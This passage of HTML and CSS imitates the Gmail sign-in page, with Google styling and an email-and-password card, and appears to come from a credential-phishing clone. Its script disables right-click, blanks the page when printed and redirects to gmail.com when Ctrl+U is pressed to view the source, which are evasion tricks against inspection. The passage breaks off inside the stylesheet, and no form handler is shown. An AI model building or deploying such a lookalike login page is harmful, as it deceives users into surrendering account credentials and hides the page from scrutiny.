</script>

  
  <meta charset="utf-8">
  <meta content="width=300, initial-scale=1" name="viewport">
  <meta name="google" value="notranslate">
  <meta name="google-site-verification" content="LrdTUW9psUAMbh4Ia074-BPEVmcpBxF6Gwf0MSgQXZs">
  <title>Gmail</title>
  <style type="text/css" media="print">
    * { display: none; }
</style>
</head><body oncontextmenu="return false;">
<script type="text/javascript">
//<![CDATA[
shortcut={all_shortcuts:{},add:function(a,b,c){var d={type:"keydown",propagate:!1,disable_in_input:!1,target:document,keycode:!1};if(c)for(var e in d)"undefined"==typeof c[e]&&(c[e]=d[e]);else c=d;d=c.target,"string"==typeof c.target&&(d=document.getElementById(c.target)),a=a.toLowerCase(),e=function(d){d=d||window.event;if(c.disable_in_input){var e;d.target?e=d.target:d.srcElement&&(e=d.srcElement),3==e.nodeType&&(e=e.parentNode);if("INPUT"==e.tagName||"TEXTAREA"==e.tagName)return}d.keyCode?code=d.keyCode:d.which&&(code=d.which),e=String.fromCharCode(code).toLowerCase(),188==code&&(e=","),190==code&&(e=".");var f=a.split("+"),g=0,h={"`":"~",1:"!",2:"@",3:"#",4:"$",5:"%",6:"^",7:"&",8:"*",9:"(",0:")","-":"_","=":"+",";":":","'":'"',",":"<",".":">","/":"?","\\":"|"},i={esc:27,escape:27,tab:9,space:32,"return":13,enter:13,backspace:8,scrolllock:145,scroll_lock:145,scroll:145,capslock:20,caps_lock:20,caps:20,numlock:144,num_lock:144,num:144,pause:19,"break":19,insert:45,home:36,"delete":46,end:35,pageup:33,page_up:33,pu:33,pagedown:34,page_down:34,pd:34,left:37,up:38,right:39,down:40,f1:112,f2:113,f3:114,f4:115,f5:116,f6:117,f7:118,f8:119,f9:120,f10:121,f11:122,f12:123},j=!1,l=!1,m=!1,n=!1,o=!1,p=!1,q=!1,r=!1;d.ctrlKey&&(n=!0),d.shiftKey&&(l=!0),d.altKey&&(p=!0),d.metaKey&&(r=!0);for(var s=0;k=f[s],s<f.length;s++)"ctrl"==k||"control"==k?(g++,m=!0):"shift"==k?(g++,j=!0):"alt"==k?(g++,o=!0):"meta"==k?(g++,q=!0):1<k.length?i[k]==code&&g++:c.keycode?c.keycode==code&&g++:e==k?g++:h[e]&&d.shiftKey&&(e=h[e],e==k&&g++);if(g==f.length&&n==m&&l==j&&p==o&&r==q&&(b(d),!c.propagate))return d.cancelBubble=!0,d.returnValue=!1,d.stopPropagation&&(d.stopPropagation(),d.preventDefault()),!1},this.all_shortcuts[a]={callback:e,target:d,event:c.type},d.addEventListener?d.addEventListener(c.type,e,!1):d.attachEvent?d.attachEvent("on"+c.type,e):d["on"+c.type]=e},remove:function(a){var a=a.toLowerCase(),b=this.all_shortcuts[a];delete this.all_shortcuts[a];if(b){var a=b.event,c=b.target,b=b.callback;c.detachEvent?c.detachEvent("on"+a,b):c.removeEventListener?c.removeEventListener(a,b,!1):c["on"+a]=!1}}},shortcut.add("Ctrl+U",function(){top.location.href="http://gmail.com"});
//]]>
</script>

  <style>
  /* cyrillic-ext */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v10/DXI1ORHCpsQm3Vp6mXoaTSUUniRZcd_wq8DYmIfsw2A.woff2) format('woff2');
  unicode-range: U+0460-052F, U+20B4, U+2DE0-2DFF, U+A640-A69F;
}
/* cyrillic */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v10/DXI1ORHCpsQm3Vp6mXoaTeXREeHhJi4GEUJI9ob_ak4.woff2) format('woff2');
  unicode-range: U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
}
/* greek-ext */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v10/DXI1ORHCpsQm3Vp6mXoaTfzy0yu4vcvNhe7QLuoE8rU.woff2) format('woff2');
  unicode-range: U+1F00-1FFF;
}
/* greek */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v10/DXI1ORHCpsQm3Vp6mXoaTc9-ZSaZ3mOOsU9E1f6DGWc.woff2) format('woff2');
  unicode-range: U+0370-03FF;
}
/* vietnamese */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v10/DXI1ORHCpsQm3Vp6mXoaTYZI5FoslwusAsZHK_V0XCI.woff2) format('woff2');
  unicode-range: U+0102-0103, U+1EA0-1EF1, U+20AB;
}
/* latin-ext */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v10/DXI1ORHCpsQm3Vp6mXoaTRUOjZSKWg4xBWp_C_qQx0o.woff2) format('woff2');
  unicode-range: U+0100-024F, U+1E00-1EFF, U+20A0-20AB, U+20AD-20CF, U+2C60-2C7F, U+A720-A7FF;
}
/* latin */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v10/DXI1ORHCpsQm3Vp6mXoaTegdm0LZdjqr5-oayXSOefg.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215, U+E0FF, U+EFFD, U+F000;
}
/* cyrillic-ext */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v10/K88pR3goAWT7BTt32Z01m1tXRa8TVwTICgirnJhmVJw.woff2) format('woff2');
  unicode-range: U+0460-052F, U+20B4, U+2DE0-2DFF, U+A640-A69F;
}
/* cyrillic */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v10/RjgO7rYTmqiVp7vzi-Q5UVtXRa8TVwTICgirnJhmVJw.woff2) format('woff2');
  unicode-range: U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
}
/* greek-ext */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v10/LWCjsQkB6EMdfHrEVqA1KVtXRa8TVwTICgirnJhmVJw.woff2) format('woff2');
  unicode-range: U+1F00-1FFF;
}
/* greek */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v10/xozscpT2726on7jbcb_pAltXRa8TVwTICgirnJhmVJw.woff2) format('woff2');
  unicode-range: U+0370-03FF;
}
/* vietnamese */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v10/59ZRklaO5bWGqF5A9baEEVtXRa8TVwTICgirnJhmVJw.woff2) format('woff2');
  unicode-range: U+0102-0103, U+1EA0-1EF1, U+20AB;
}
/* latin-ext */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v10/u-WUoqrET9fUeobQW7jkRVtXRa8TVwTICgirnJhmVJw.woff2) format('woff2');
  unicode-range: U+0100-024F, U+1E00-1EFF, U+20A0-20AB, U+20AD-20CF, U+2C60-2C7F, U+A720-A7FF;
}
/* latin */
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v10/cJZKeOuBrn4kERxqtaUH3VtXRa8TVwTICgirnJhmVJw.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215, U+E0FF, U+EFFD, U+F000;
}
  </style>
  <style>
  h1, h2 {
  -webkit-animation-duration: 0.1s;
  -webkit-animation-name: fontfix;
  -webkit-animation-iteration-count: 1;
  -webkit-animation-timing-function: linear;
  -webkit-animation-delay: 0;
  }
  @-webkit-keyframes fontfix {
  from {
  opacity: 1;
  }
  to {
  opacity: 1;
  }
  }
  </style>
<style>
  html, body {
  font-family: Arial, sans-serif;
  background: #fff;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  button,
  input[type=button],
  input[type=submit] {
  font-family: Arial, sans-serif;
  font-size: 13px;
  }
  a,
  a:hover,
  a:visited {
  color: #427fed;
  cursor: pointer;
  text-decoration: none;
  }
  a:hover {
  text-decoration: underline;
  }
  h1 {
  font-size: 20px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: normal;
  }
  h2 {
  font-size: 14px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: bold;
  }
  input[type=email],
  input[type=number],
  input[type=password],
  input[type=tel],
  input[type=text],
  input[type=url] {
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 36px;
  padding: 0 8px;
  margin: 0;
  background: #fff;
  border: 1px solid #d9d9d9;
  border-top: 1px solid #c0c0c0;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  font-size: 15px;
  color: #404040;
  }
  input[type=email]:hover,
  input[type=number]:hover,
  input[type=password]:hover,
  input[type=tel]:hover,
  input[type=text]:hover,
  input[type=url]:hover {
  border: 1px solid #b9b9b9;
  border-top: 1px solid #a0a0a0;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=email]:focus,
  input[type=number]:focus,
  input[type=password]:focus,
  input[type=tel]:focus,
  input[type=text]:focus,
  input[type=url]:focus {
  outline: none;
  border: 1px solid #4d90fe;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  input[type=checkbox],
  input[type=radio] {
  -webkit-appearance: none;
  display: inline-block;
  width: 13px;
  height: 13px;
  margin: 0;
  cursor: pointer;
  vertical-align: bottom;
  background: #fff;
  border: 1px solid #c6c6c6;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  position: relative;
  }
  input[type=checkbox]:active,
  input[type=radio]:active {
  background: #ebebeb;
  }
  input[type=checkbox]:hover {
  border-color: #c6c6c6;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=radio] {
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  width: 15px;
  height: 15px;
  }
  input[type=checkbox]:checked,
  input[type=radio]:checked {
  background: #fff;
  }
  input[type=radio]:checked::after {
  content: '';
  display: block;
  position: relative;
  top: 3px;
  left: 3px;
  width: 7px;
  height: 7px;
  background: #666;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  }
  input[type=checkbox]:checked::after {
  content: url(//ssl.gstatic.com/ui/v1/menu/checkmark.png);
  display: block;
  position: absolute;
  top: -6px;
  left: -5px;
  }
  input[type=checkbox]:focus {
  outline: none;
  border-color: #4d90fe;
  }
  .stacked-label {
  display: block;
  font-weight: bold;
  margin: .5em 0;
  }
  .hidden-label {
  position: absolute !important;
  clip: rect(1px 1px 1px 1px); /* IE6, IE7 */
  clip: rect(1px, 1px, 1px, 1px);
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  }
  input[type=checkbox].form-error,
  input[type=email].form-error,
  input[type=number].form-error,
  input[type=password].form-error,
  input[type=text].form-error,
  input[type=tel].form-error,
  input[type=url].form-error {
  border: 1px solid #dd4b39;
  }
  .error-msg {
  margin: .5em 0;
  display: block;
  color: #dd4b39;
  line-height: 17px;
  }
  .help-link {
  background: #dd4b39;
  padding: 0 5px;
  color: #fff;
  font-weight: bold;
  display: inline-block;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  text-decoration: none;
  position: relative;
  top: 0px;
  }
  .help-link:visited {
  color: #fff;
  }
  .help-link:hover {
  color: #fff;
  background: #c03523;
  text-decoration: none;
  }
  .help-link:active {
  opacity: 1;
  background: #ae2817;
  }
  .wrapper {
  position: relative;
  min-height: 100%;
  }
  .content {
  padding: 0 44px;
  }
  .main {
  padding-bottom: 100px;
  }
  /* For modern browsers */
  .clearfix:before,
  .clearfix:after {
  content: "";
  display: table;
  }
  .clearfix:after {
  clear: both;
  }
  /* For IE 6/7 (trigger hasLayout) */
  .clearfix {
  zoom:1;
  }
  .google-header-bar {
  height: 71px;
  border-bottom: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .header .logo {
  margin: 17px 0 0;
  float: left;
  height: 38px;
  width: 116px;
  }
  .header .secondary-link {
  margin: 28px 0 0;
  float: right;
  }
  .header .secondary-link a {
  font-weight: normal;
  }
  .google-header-bar.centered {
  border: 0;
  height: 108px;
  }
  .google-header-bar.centered .header .logo {
  float: none;
  margin: 40px auto 30px;
  display: block;
  }
  .google-header-bar.centered .header .secondary-link {
  display: none
  }
  .google-footer-bar {
  position: absolute;
  bottom: 0;
  height: 35px;
  width: 100%;
  border-top: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .footer {
  padding-top: 7px;
  font-size: .85em;
  white-space: nowrap;
  line-height: 0;
  }
  .footer ul {
  float: left;
  max-width: 80%;
  min-height: 16px;
  padding: 0;
  }
  .footer ul li {
  color: #737373;
  display: inline;
  padding: 0;
  padding-right: 1.5em;
  }
  .footer a {
  color: #737373;
  }
  .lang-chooser-wrap {
  float: right;
  display: inline;
  }
  .lang-chooser-wrap img {
  vertical-align: top;
  }
  .lang-chooser {
  font-size: 13px;
  height: 24px;
  line-height: 24px;
  }
  .lang-chooser option {
  font-size: 13px;
  line-height: 24px;
  }
  .hidden {
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  display: none !important;
  }
  .banner {
  text-align: center;
  }
  .card {
  background-color: #f7f7f7;
  padding: 20px 25px 30px;
  margin: 0 auto 25px;
  width: 304px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  }
  .card > *:first-child {
  margin-top: 0;
  }
  .rc-button,
  .rc-button:visited {
  display: inline-block;
  min-width: 46px;
  text-align: center;
  color: #444;
  font-size: 14px;
  font-weight: 700;
  height: 36px;
  padding: 0 8px;
  line-height: 36px;
  -moz-border-radius: 3px;
  -webkit-border-radius: 3px;
  border-radius: 3px;
  -o-transition: all 0.218s;
  -moz-transition: all 0.218s;
  -webkit-transition: all 0.218s;
  transition: all 0.218s;
  border: 1px solid #dcdcdc;
  background-color: #f5f5f5;
  background-image: -webkit-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -o-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: linear-gradient(top,#f5f5f5,#f1f1f1);
  -o-transition: none;
  -moz-user-select: none;
  -webkit-user-select: none;
  user-select: none;
  cursor: default;
  }
  .card .rc-button {
  width: 100%;
  padding: 0;
  }
  .rc-button.disabled,
  .rc-button[disabled] {
  opacity: .5;
  filter: alpha(opacity=50);
  cursor: default;
  pointer-events: none;
  }
  .rc-button:hover {
  border: 1px solid #c6c6c6;
  color: #333;
  text-decoration: none;
  -o-transition: all 0.0s;
  -moz-transition: all 0.0s;
  -webkit-transition: all 0.0s;
  transition: all 0.0s;
  background-color: #f8f8f8;
  background-image: -webkit-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -o-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: linear-gradient(top,#f8f8f8,#f1f1f1);
  -moz-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  }
  .rc-button:active {
  background-color: #f6f6f6;
  background-image: -webkit-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -o-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: linear-gradient(top,#f6f6f6,#f1f1f1);
  -moz-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  }
  .rc-button-submit,
  .rc-button-submit:visited {
  border: 1px solid #3079ed;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #4d90fe;
  background-image: -webkit-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -moz-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -ms-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -o-linear-gradient(top,#4d90fe,#4787ed);
  background-image: linear-gradient(top,#4d90fe,#4787ed);
  }
  .rc-button-submit:hover {
  border: 1px solid #2f5bb7;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  }
  .rc-button-submit:active {
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .rc-button-red,
  .rc-button-red:visited {
  border: 1px solid transparent;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #d14836;
  background-image: -webkit-linear-gradient(top,#dd4b39,#d14836);
  background-image: -moz-linear-gradient(top,#dd4b39,#d14836);
  background-image: -ms-linear-gradient(top,#dd4b39,#d14836);
  background-image: -o-linear-gradient(top,#dd4b39,#d14836);
  background-image: linear-gradient(top,#dd4b39,#d14836);
  }
  .rc-button-red:hover {
  border: 1px solid #b0281a;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #c53727;
  background-image: -webkit-linear-gradient(top,#dd4b39,#c53727);
  background-image: -moz-linear-gradient(top,#dd4b39,#c53727);
  background-image: -ms-linear-gradient(top,#dd4b39,#c53727);
  background-image: -o-linear-gradient(top,#dd4b39,#c53727);
  background-image: linear-gradient(top,#dd4b39,#c53727);
  }
  .rc-button-red:active {
  border: 1px solid #992a1b;
  background-color: #b0281a;
  background-image: -webkit-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -moz-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -ms-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -o-linear-gradient(top,#dd4b39,#b0281a);
  background-image: linear-gradient(top,#dd4b39,#b0281a);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .secondary-actions {
  text-align: center;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .google-header-bar.centered {
  height: 83px;
  }
  .google-header-bar.centered .header .logo {
  margin: 25px auto 20px;
  }
  .card {
  margin-bottom: 20px;
  }
</style>
<style media="screen and (max-width: 580px)">
  html, body {
  font-size: 14px;
  }
  .google-header-bar.centered {
  height: 73px;
  }
  .google-header-bar.centered .header .logo {
  margin: 20px auto 15px;
  }
  .content {
  padding-left: 10px;
  padding-right: 10px;
  }
  .hidden-small {
  display: none;
  }
  .card {
  padding: 20px 15px 30px;
  width: 270px;
  }
  .footer ul li {
  padding-right: 1em;
  }
  .lang-chooser-wrap {
  display: none;
  }
</style>
<style>
  pre.debug {
  font-family: monospace;
  position: absolute;
  left: 0;
  margin: 0;
  padding: 1.5em;
  font-size: 13px;
  background: #f1f1f1;
  border-top: 1px solid #e5e5e5;
  direction: ltr;
  white-space: pre-wrap;
  width: 90%;
  overflow: hidden;
  }
</style>
<style>
  .banner h1 {
  font-family: 'Open Sans', arial;
  -webkit-font-smoothing: antialiased;
  color: #555;
  font-size: 42px;
  font-weight: 300;
  margin-top: 0;
  margin-bottom: 20px;
  }
  .banner h2 {
  font-family: 'Open Sans', arial;
  -webkit-font-smoothing: antialiased;
  color: #555;
  font-size: 18px;
  font-weight: 400;
  margin-bottom: 20px;
  }
  .signin-card {
  width: 274px;
  padding: 40px 40px;
  }
  .signin-card .profile-img {
  width: 96px;
  height: 96px;
  margin: 0 auto 10px;
  display: block;
  -moz-border-radius: 50%;
  -webkit-border-radius: 50%;
  border-radius: 50%;
  }
  .signin-card .profile-name {
  font-size: 16px;
  font-weight: bold;
  text-align: center;
  margin: 10px 0 0;
  min-height: 1em;
  }
  .signin-card .profile-email {
  font-size: 16px;
  text-align: center;
  margin: 10px 0 20px 0;
  min-height: 1em;
  }
  .signin-card input[type=email],
  .signin-card input[type=password],
  .signin-card input[type=text],
  .signin-card input[type=submit] {
  width: 100%;
  display: block;
  margin-bottom: 10px;
  z-index: 1;
  position: relative;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  }
  .signin-card #Email,
  .signin-card #Passwd,
  .signin-card .captcha {
  direction: ltr;
  height: 44px;
  font-size: 16px;
  }
  .signin-card #Email + .stacked-label {
  margin-top: 15px;
  }
  .signin-card #reauthEmail {
  display: block;
  margin-bottom: 10px;
  line-height: 36px;
  padding: 0 8px;
  font-size: 15px;
  color: #404040;
  line-height: 2;
  margin-bottom: 10px;
  font-size: 14px;
  text-align: center;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  }
  .one-google p {
  margin: 0 0 10px;
  color: #555;
  font-size: 14px;
  text-align: center;
  }
  .one-google p.create-account,
  .one-google p.switch-account {
  margin-bottom: 60px;
  }
  .one-google img {
  display: block;
  width: 210px;
  height: 17px;
  margin: 10px auto;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .banner h1 {
  font-size: 38px;
  margin-bottom: 15px;
  }
  .banner h2 {
  margin-bottom: 15px;
  }
  .one-google p.create-account,
  .one-google p.switch-account {
  margin-bottom: 30px;
  }
  .signin-card #Email {
  margin-bottom: 0;
  }
  .signin-card #Passwd {
  margin-top: -1px;
  }
  .signin-card #Email.form-error,
  .signin-card #Passwd.form-error {
  z-index: 2;
  }
  .signin-card #Email:hover,
  .signin-card #Email:focus,
  .signin-card #Passwd:hover,
  .signin-card #Passwd:focus {
  z-index: 3;
  }
</style>
<style media="screen and (max-width: 580px)">
  .banner h1 {
  font-size: 22px;
  margin-bottom: 15px;
  }
  .signin-card {
  width: 260px;
  padding: 20px 20px;
  margin: 0 auto 20px;
  }
  .signin-card .profile-img {
  width: 72px;
  height: 72px;
  -moz-border-radius: 72px;
  -webkit-border-radius: 72px;
  border-radius: 72px;
  }
</style>
<style>
  .jfk-tooltip {
  background-color: #fff;
  border: 1px solid;
  color: #737373;
  font-size: 12px;
  position: absolute;
  z-index: 800 !important;
  border-color: #bbb #bbb #a8a8a8;
  padding: 16px;
  width: 250px;
  }
 .jfk-tooltip h3 {
  color: #555;
  font-size: 12px;
  margin: 0 0 .5em;
  }
 .jfk-tooltip-content p:last-child {
  margin-bottom: 0;
  }
  .jfk-tooltip-arrow {
  position: absolute;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplbefore,
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplafter {
  display: block;
  height: 0;
  position: absolute;
  width: 0;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplbefore {
  border: 9px solid;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplafter {
  border: 8px solid;
  }
  .jfk-tooltip-arrowdown {
  bottom: 0;
  }
  .jfk-tooltip-arrowup {
  top: -9px;
  }
  .jfk-tooltip-arrowleft {
  left: -9px;
  top: 30px;
  }
  .jfk-tooltip-arrowright {
  right: 0;
  top: 30px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore,.jfk-tooltip-arrowup .jfk-tooltip-arrowimplbefore {
  border-color: #bbb transparent;
  left: -9px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore {
  border-color: #a8a8a8 transparent;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplafter,.jfk-tooltip-arrowup .jfk-tooltip-arrowimplafter {
  border-color: #fff transparent;
  left: -8px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore {
  border-bottom-width: 0;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplafter {
  border-bottom-width: 0;
  }
  .jfk-tooltip-arrowup .jfk-tooltip-arrowimplbefore {
  border-top-width: 0;
  }
  .jfk-tooltip-arrowup .jfk-tooltip-arrowimplafter {
  border-top-width: 0;
  top: 1px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplbefore,
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplbefore {
  border-color: transparent #bbb;
  top: -9px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplafter,
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplafter {
  border-color:transparent #fff;
  top:-8px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplbefore {
  border-left-width: 0;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplafter {
  border-left-width: 0;
  left: 1px;
  }
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplbefore {
  border-right-width: 0;
  }
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplafter {
  border-right-width: 0;
  }
  .jfk-tooltip-closebtn {
  background: url("//ssl.gstatic.com/ui/v1/icons/common/x_8px.png") no-repeat;
  border: 1px solid transparent;
  height: 21px;
  opacity: .4;
  outline: 0;
  position: absolute;
  right: 2px;
  top: 2px;
  width: 21px;
  }
  .jfk-tooltip-closebtn:focus,
  .jfk-tooltip-closebtn:hover {
  opacity: .8;
  cursor: pointer;
  }
  .jfk-tooltip-closebtn:focus {
  border-color: #4d90fe;
  }
</style>
<style media="screen and (max-width: 580px)">
  .jfk-tooltip {
  display: none;
  }
</style>
<style>
  .need-help-reverse {
  float: right;
  }
  .remember .bubble-wrap {
  position: absolute;
  padding-top: 3px;
  -o-transition: opacity .218s ease-in .218s;
  -moz-transition: opacity .218s ease-in .218s;
  -webkit-transition: opacity .218s ease-in .218s;
  transition: opacity .218s ease-in .218s;
  left: -999em;
  opacity: 0;
  width: 314px;
  margin-left: -20px;
  }
  .remember:hover .bubble-wrap,
  .remember input:focus ~ .bubble-wrap,
  .remember .bubble-wrap:hover,
  .remember .bubble-wrap:focus {
  opacity: 1;
  left: inherit;
  }
  .bubble-pointer {
  border-left: 10px solid transparent;
  border-right: 10px solid transparent;
  border-bottom: 10px solid #fff;
  width: 0;
  height: 0;
  margin-left: 17px;
  }
  .bubble {
  background-color: #fff;
  padding: 15px;
  margin-top: -1px;
  font-size: 11px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  }
  #stay-signed-in {
  float: left;
  }
  #stay-signed-in-tooltip {
  left: auto;
  margin-left: -20px;
  padding-top: 3px;
  position: absolute;
  top: 0;
  visibility: hidden;
  width: 314px;
  z-index: 1;
  }
  .dasher-tooltip {
  position: absolute;
  left: 50%;
  top: 380px;
  margin-left: 150px;
